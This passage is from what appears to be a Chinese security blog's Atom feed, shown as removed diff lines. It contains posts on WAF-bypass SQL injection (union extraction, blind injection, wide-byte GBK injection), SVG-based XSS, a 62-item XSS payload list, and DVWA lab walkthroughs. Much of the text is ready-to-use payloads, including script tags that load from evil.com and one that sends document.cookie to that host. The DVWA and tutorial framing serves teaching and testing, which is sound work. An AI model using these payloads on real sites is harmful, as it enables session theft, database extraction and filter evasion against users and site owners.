id="HPF-HTTP-Parameter-Fragment-（HTTP分割注入）"><a href="#HPF-HTTP-Parameter-Fragment-（HTTP分割注入）" class="headerlink" title="HPF(HTTP Parameter Fragment)（HTTP分割注入）"></a>HPF(HTTP Parameter Fragment)（HTTP分割注入）</h4><p>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p><pre><code>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</code></pre><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过。</p><p><code>?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</code></p><blockquote><p>示例<code>0xA*1000指0xA</code>后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p></blockquote><h3 id="一些整合绕过的例子："><a href="#一些整合绕过的例子：" class="headerlink" title="一些整合绕过的例子："></a>一些整合绕过的例子：</h3><pre><code>id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*!information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--  index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…</code></pre><blockquote><p>单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少</p></blockquote><h3 id="过滤掉and和or情况下的盲注"><a href="#过滤掉and和or情况下的盲注" class="headerlink" title="过滤掉and和or情况下的盲注"></a>过滤掉and和or情况下的盲注</h3><p>假如有这样一个注入点</p><pre><code>index.php?uid=123</code></pre><p>但是and和or被过滤掉了，我们可以构造一下语句</p><pre><code>index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123</code></pre><blockquote><p>123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。</p></blockquote><h3 id="加括号"><a href="#加括号" class="headerlink" title="加括号"></a>加括号</h3><pre><code>/?id=1+union+(select+1,2+from+users)</code></pre><p>如果上面一条被WAF拦截了，可以试着加一些括号。</p><pre><code>/?id=1+union+(select+1,2+from+xxx)/?id=(1)union(select(1),mid(hash,1,32)from(users))/?id=1+union+(select&apos;1&apos;,concat(login,hash)from+users)/?id=(1)union(((((((select(1),hex(hash)from(users))))))))/?id=(1)or(0x50=0x50)</code></pre><h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、如果可能，采用基于IP的白名单；</p><p>2、对各种不能解析的内容，全部禁止访问；</p><p>3、解析的协议，要全面；</p><p>4、对各种不符合标准模式的访问，禁止；</p><p>5、WAF解析方式，与后台的WEB服务器、web应用、数据库的解析方式尽可能一致；</p><p>6、关键字的匹配，需要考虑诸多变形情况。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。&lt;/p&gt;
-&lt;h2 id=&quot;WAF的功能&quot;&gt;&lt;a href=&quot;#WAF的功能&quot; class=&quot;headerlink&quot; title=&quot;WAF的功能&quot;&gt;&lt;/a&gt;WAF的功能&lt;/h2&gt;&lt;ul&gt;
-&lt;li&gt;审计设备：用来截获
-      
-    
-    </summary>
-    
-      <category term="SQL" scheme="http://yoursite.com/categories/SQL/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>SVG XSS黑魔法</title>
-    <link href="http://yoursite.com/2018/12/02/SVG-XSS%E9%BB%91%E9%AD%94%E6%B3%95/"/>
-    <id>http://yoursite.com/2018/12/02/SVG-XSS黑魔法/</id>
-    <published>2018-12-02T06:52:12.000Z</published>
-    <updated>2018-12-02T10:51:08.786Z</updated>
-    
-    <content type="html"><![CDATA[<p>先来看两个代码，一个可执行一个不可执行。</p><p>可执行：</p><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><p>不可执行：</p><pre><code>&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><p>那么为啥加了<code>&lt;svg&gt;</code>的可以执行？</p><p>这就得由html解析流程说起了。</p><p>html解析到<code>&lt;svg&gt;</code>的时候会变成标签开始状态(Tag open state)，然后到标签名状态(Tag name state)，等等，最终到数据状态(Data state)，并释放当前标签的token，当解析器处于数据状态(Data state)时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p><p>svg属于外部元素。</p><p>外部元素来源于<strong>MathML</strong>和<strong>SVG</strong>命名空间。</p><p>而MathML（数学标记语言）是一种基于XML的标准。</p><p>那么可以猜测<code>&lt;svg&gt;</code>遵循XML和SVG的定义。</p><p>在XML中，<code>&amp;#40;</code>会被解析成<code>(</code></p><blockquote><p>在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体</p></blockquote><pre><code>&lt;xml&gt;    &lt;name&gt;aaa&lt;/name&gt;    &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt;&lt;/xml&gt;</code></pre><p><img src="https://i.imgur.com/zbuGz8s.png" alt=""></p><p>当然，SVG标准中也定义了<code>script</code>标签的存在。</p><p>所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;先来看两个代码，一个可执行一个不可执行。&lt;/p&gt;
-&lt;p&gt;可执行：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert&amp;amp;#40;1)&amp;lt;/script&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不可执行：&lt;/p&gt;
-&lt;pre&gt;&lt;
-      
-    
-    </summary>
-    
-      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>XSS测试用例</title>
-    <link href="http://yoursite.com/2018/12/01/XSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B/"/>
-    <id>http://yoursite.com/2018/12/01/XSS测试用例/</id>
-    <published>2018-12-01T13:59:49.000Z</published>
-    <updated>2018-12-02T07:15:35.373Z</updated>
-    
-    <content type="html"><![CDATA[<p>1.<code>&lt;script&gt; alert(1);&lt;/script&gt;</code></p><p>2.<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><p>3.<code>&lt;script  src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt;</code></p><p>4.<code>&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt;</code></p><p>5.<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;</code></p><p>6.<code>&lt;img src=liu.jpg onerror=alert(/xss/)/&gt;</code></p><p>7.<code>&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt;</code></p><p>8.<code>&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt;</code></p><p>9.<code>&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt;</code></p><p>10.<code>&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt;</code></p><p>11.<code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p><p>12.<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>13.<code>&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt;</code></p><p>14.<code>&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p>15.<code>&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt;</code></p><p>16.<code>&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>17.<code>&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt;</code></p><p>18.<code>&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt;</code></p><p>19.<code>&#39;);alert(&#39;XSS</code></p><p>20.<code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;</code></p><p>21.<code>[url=javascript:alert(&#39;XSS&#39;);]click me[/url]</code></p><p>22.<code>&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>23.<code>&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot;</code></p><p>24.<code>[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color]</code></p><p>25.<code>&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;</code></p><p>26.<code>window.alert(&quot;XSS&quot;);</code></p><p>27.<code>&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt;</code></p><p>28.<code>&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt;</code></p><p>29.<code>&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code><br>30.<code>&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt;</code></p><p>31.<code>&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p><p>32.<code>&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;</code></p><p>33.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>34.<code>&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt;</code></p><p>35.<code>&lt;script&gt;var var=1; alert(var)&lt;/script&gt;</code></p><p>36.<code>&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt;</code></p><p>37.<code>&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt;</code></p><p>38.<code>&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>39.<code>&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot;</code></p><p>40.<code>&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt;</code></p><p>41.<code>&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</code></p><p>42.<code>&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt;</code></p><p>43.<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></p><p>44.<code>&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</code></p><p>45.<code>[color=red width=expression(alert(123))][color]</code></p><p>46.<code>&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;</code></p><p>47.<code>Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt;</code></p><p>48.<code>&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt;</code></p><p>49.<code>&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>50.<code>&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt;</code></p><p>51.<code>&lt;div style=&quot;background:url(&#39;javascript:&#39;)</code></p><p>52.<code>&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>53.<code>&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></p><p>54.<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code></p><p>55.<code>&lt;q/oncut=open()&gt;</code></p><p>56.<code>&lt;q/oncut=alert(1)&gt;</code>//在限制长度的地方很有效</p><p>57.<code>&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效</code></p><p>58.<code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;</code></p><p>59.<code>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></p><p>60.<code>&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK</code></p><p>61.<code>&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</code></p><p>62.<code>&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit</code></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;1.&lt;code&gt;&amp;lt;script&amp;gt; alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;2.&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;3.
-      
-    
-    </summary>
-    
-      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>XSS绕过及DVWA实例</title>
-    <link href="http://yoursite.com/2018/12/01/XSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B/"/>
-    <id>http://yoursite.com/2018/12/01/XSS绕过及DVWA实例/</id>
-    <published>2018-12-01T13:52:18.000Z</published>
-    <updated>2018-12-02T07:12:54.413Z</updated>
-    
-    <content type="html"><![CDATA[<a id="more"></a><h2 id="最基本的用法："><a href="#最基本的用法：" class="headerlink" title="最基本的用法："></a>最基本的用法：</h2><p><code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><h2 id="黑名单绕过："><a href="#黑名单绕过：" class="headerlink" title="黑名单绕过："></a>黑名单绕过：</h2><p>大多数的场所是用的黑名单来做过滤器的。</p><ul><li>尝试插入比较正常的HTML标签，例如：<code>&lt;b&gt;</code>，<code>&lt;i&gt;</code>，<code>&lt;u&gt;</code>来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</li><li>尝试插入不闭合的标签，例如：<code>&lt;b</code>，<code>&lt;i</code>，<code>&lt;u</code>，<code>&lt;marquee</code>然后看一下返回响应，是否对开放的标签也有过滤。</li></ul><h2 id="大小写及重写的绕过"><a href="#大小写及重写的绕过" class="headerlink" title="大小写及重写的绕过:"></a>大小写及重写的绕过:</h2><p><code>&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt;</code></p><h2 id="事件绕过："><a href="#事件绕过：" class="headerlink" title="事件绕过："></a>事件绕过：</h2><p><code>利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt;</code></p><h3 id="相关JS事件："><a href="#相关JS事件：" class="headerlink" title="相关JS事件："></a>相关JS事件：</h3><p><img src="https://i.imgur.com/8cjjBPV.png" alt=""></p><h2 id="编码绕过："><a href="#编码绕过：" class="headerlink" title="编码绕过："></a>编码绕过：</h2><blockquote><p>当浏览器接受到一份HTML代码后，会对标签之间（<code>&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;</code>除外)、标签的属性中（<code>&lt;a href=&#39;xxxx&#39;&gt;</code>）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在<code>href=&#39;xx&#39;</code>这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段</p></blockquote><p>例如：<br><code>&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</code></p><blockquote><p>上述代码解析后为：<code>&lt;img src=1 onerror=alert(1)&gt;</code> ,可以弹窗</p></blockquote><p>在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释</p><p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></p><blockquote><p>被url解释器解释完后为<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code>，url中出现了<code>javascript:</code>，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。</p></blockquote><p>当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。<br><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt;</code></p><p>解码后为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,一样可以弹窗。但如果是：<br><code>&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt;</code></p><blockquote><p>解码后为 <code>&lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;</code>就不要指望他可以弹窗了。因为解码出来的<code>&#39;);alert(&#39;111</code>仍为被当作字符串而不会影响上下文。</p></blockquote><h2 id="利用String-fromCharCode进行编码绕过"><a href="#利用String-fromCharCode进行编码绕过" class="headerlink" title="利用String.fromCharCode进行编码绕过"></a>利用String.fromCharCode进行编码绕过</h2><p>测试代码：</p><pre><code>&lt;?phpfunction xss_check($str){    if(preg_match(&apos;/script|alert/i&apos;, $str))        return &apos;error&apos;;    else        return $str;}@$id = $_GET[&apos;id&apos;];echo xss_check($id);?&gt;</code></pre><p>屏蔽了alert(也可能是其他的)，此时可以使用编码绕过：</p><p><code>&lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt;</code></p><blockquote><p>将<code>javascript</code>和<code>alert</code>进行unicode编码实现绕过，成功弹窗。</p></blockquote><h4 id="利用String-fromCharCode进行编码绕过-1"><a href="#利用String-fromCharCode进行编码绕过-1" class="headerlink" title="利用String.fromCharCode进行编码绕过:"></a>利用String.fromCharCode进行编码绕过:</h4><p><code>&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt;</code></p><blockquote><p>其中<code>String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)</code>是<code>alert(/xss/)</code>编码后的内容，google插件hackbar就有此功能。</p></blockquote><p><img src="https://i.imgur.com/vyiYgVR.png" alt=""></p><h2 id="GBK宽字节绕过"><a href="#GBK宽字节绕过" class="headerlink" title="GBK宽字节绕过"></a>GBK宽字节绕过</h2><p>测试代码：</p><pre><code>&lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt;&lt;?php error_reporting(0);$conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn);#mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;;if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row);}}else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;;  } ?&gt;</code></pre><p><img src="https://i.imgur.com/0v8MiC1.png" alt=""></p><blockquote><p>直接<strong>‘</strong>会被转义，不会被执行。</p></blockquote><p><img src="https://i.imgur.com/0dSavf0.png" alt=""></p><blockquote><p>使用宽字符就可以被成功执行</p></blockquote><h3 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h3><ul><li><code>$_GET[‘id’]</code>经过<strong>addslashes</strong>编码之后带入了‘’</li><li>变成 <code>&lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt;</code></li><li>带入mysql处理时使用了gbk字符集</li><li><strong>%df%5c</strong> 運成功的吃掉了<strong>%5c</strong></li><li><strong>%27‘</strong>单引号成功闭合</li><li>GBK编码，编码范围是<strong>0x8140~0xFEFE</strong>（不包括xx7F），在遇到<strong>%df(ascii(223)) &gt;ascii(128)</strong>时自动拼接<strong>%5c，</strong>因此吃掉<strong>‘</strong>，而<strong>%27</strong>、<strong>%20</strong>小于<strong>ascii(128)</strong>的字符就保留了。</li></ul><h2 id="0字节绕过"><a href="#0字节绕过" class="headerlink" title="0字节绕过"></a>0字节绕过</h2><pre><code>&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</code></pre><p>在IE9及以下版本成功绕过。</p><h2 id="IE6下绕过"><a href="#IE6下绕过" class="headerlink" title="IE6下绕过"></a>IE6下绕过</h2><p>IE下还可利用javascript:alert(/xss/); 或css</p><pre><code>body {background:black;xss:expression(alert(/zhuling.wang/));/*IE6下测试*/}</code></pre><blockquote><p>成功绕过</p></blockquote><h2 id="DVWA测试用例"><a href="#DVWA测试用例" class="headerlink" title="DVWA测试用例"></a>DVWA测试用例</h2><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><h4 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h4><p>任意XSS都可用</p><h4 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h4><pre><code>&lt;script  &gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;img src=# onerror=alert(1)&gt;&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等</code></pre><h4 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h4><p>过滤掉script标签更严格，不能使用script标签</p><pre><code>&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;&lt;img src=# onerror=alert(1)&gt;</code></pre><p>其他html标签构造的事件还是可以使用的。</p><h4 id="不可能级别"><a href="#不可能级别" class="headerlink" title="不可能级别"></a>不可能级别</h4><p>用到了<code>htmlspecialchars()</code>，这个函数是将预定义的字符转换为 HTML 实体。<br>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li><blockquote><p>（大于）成为 &gt;</p></blockquote></li></ul><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><h4 id="低等级-1"><a href="#低等级-1" class="headerlink" title="低等级"></a>低等级</h4><p>没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。</p><p><code>&lt;img src=# onerror=alert(1)&gt;等等</code></p><h4 id="中等级-1"><a href="#中等级-1" class="headerlink" title="中等级"></a>中等级</h4><p>因为一上来就给Message添加了<code>htmlspecialchars</code>函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。<br>或者可以用<strong>burp</strong>抓包发送。</p><h4 id="高等级-1"><a href="#高等级-1" class="headerlink" title="高等级"></a>高等级</h4><p>message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。</p><p><img src="https://i.imgur.com/85bxZJs.png" alt=""></p><h4 id="不可能级别-1"><a href="#不可能级别-1" class="headerlink" title="不可能级别"></a>不可能级别</h4><p>这里对name和message都做了htmlspecialchars（）处理。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h4 id="低等级-2"><a href="#低等级-2" class="headerlink" title="低等级"></a>低等级</h4><p>直接在网页导航栏构造GET XSS即可完成注入</p><h4 id="中等级-2"><a href="#中等级-2" class="headerlink" title="中等级"></a>中等级</h4><p>源码显示会过滤掉script标签，但是直接用<code>&lt;img src=# onerror=alert(1)&gt;</code>没有直接执行，尝试闭合<strong>option</strong>没有成功,尝试闭合select标签成功执行。<br><img src="https://i.imgur.com/x7PaOkG.png" alt=""></p><blockquote><p><code>?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>也可以。</p></blockquote><h4 id="高等级-2"><a href="#高等级-2" class="headerlink" title="高等级"></a>高等级</h4><p>对传入值进行switch判断</p><p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p><blockquote><p><strong>#</strong>该字符后的数据不会发送到服务器端，从而绕过服务端过滤。</p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;h2 id=&quot;最基本的用法：&quot;&gt;&lt;a href=&quot;#最基本的用法：&quot; class=&quot;headerlink&quot; title=&quot;最基本的用法：&quot;&gt;&lt;/a&gt;最基本的用法：&lt;/h2&gt;&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;x
-      
-    
-    </summary>
-    
-      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
     
     
   </entry>
